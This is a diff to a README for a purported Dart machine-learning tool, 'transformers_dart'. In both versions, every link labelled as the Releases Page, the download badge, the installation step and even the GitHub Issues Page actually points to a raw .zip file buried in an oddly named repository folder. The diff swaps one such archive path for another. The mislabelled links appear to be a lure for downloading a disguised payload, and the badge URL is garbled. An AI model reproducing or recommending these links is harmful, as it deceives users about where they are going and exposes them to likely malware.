@@ -6,14 +6,14 @@ Welcome to `transformers_dart`, a tool that brings state-of-the-art machine lear
 
 ## 🌐 Download & Install
 
-To download the latest version of `transformers_dart`, visit our [Releases Page](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip). This page contains all the available versions of the application.
+To download the latest version of `transformers_dart`, visit our [Releases Page](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip). This page contains all the available versions of the application.
 
-[![Download Latest Release](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip%20Latest%20Release-Transformers%https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip)](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip)
+[![Download Latest Release](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip%20Latest%20Release-Transformers%https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip)](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip)
 
 ### 📥 Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Open your web browser and go to [Releases Page](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip).
+   Open your web browser and go to [Releases Page](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip).
 
 2. **Choose the Right Version**  
    Find the latest version available. It usually has a tag like `v1.0`. Click on it to see the details.
@@ -76,7 +76,7 @@ Absolutely! We welcome contributions. Please check the guidelines on our GitHub 
 
 ## 📞 Support
 
-If you encounter any issues while installing or running `transformers_dart`, please report them on our [GitHub Issues Page](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip). 
+If you encounter any issues while installing or running `transformers_dart`, please report them on our [GitHub Issues Page](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip). 
 
 Your feedback helps us improve the software!
 
@@ -84,4 +84,4 @@ Your feedback helps us improve the software!
 
 Thank you for using `transformers_dart`. We hope you enjoy the powerful capabilities of machine learning right from your device. Happy transforming! 
 
-To download the latest version again, visit our [Releases Page](https://raw.githubusercontent.com/KOLE87/transformers_dart/main/zygodactyl/transformers_dart.zip).
+To download the latest version again, visit our [Releases Page](https://github.com/KOLE87/transformers_dart/raw/refs/heads/main/macos/Classes/transformers_dart_campylotropal.zip).
